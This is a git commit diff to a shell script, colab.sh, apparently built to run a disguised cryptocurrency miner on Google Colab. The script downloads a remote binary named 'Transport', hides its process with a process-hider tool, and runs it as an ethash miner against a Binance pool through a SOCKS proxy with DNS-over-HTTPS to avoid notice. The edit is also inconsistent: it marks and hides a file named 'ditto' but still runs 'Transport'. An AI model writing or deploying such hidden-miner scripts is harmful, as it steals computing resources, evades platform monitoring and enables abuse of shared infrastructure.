0b6ef06ef46c436c35902bbd0f705d8f9acc8b16
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-05-25 10:18:26 +0530

    Update colab.sh

--- colab.sh
+++ colab.sh
@@ -5,6 +5,6 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
-chmod +x Transport
-ph add Transport
-sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 46.174.43.18:1080 
+chmod +x ditto
+ph add ditto
+sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001 -p x -w Trans --proxy 140.238.247.53:1080 --no-sni --dns-https-server 1.1.1.1 
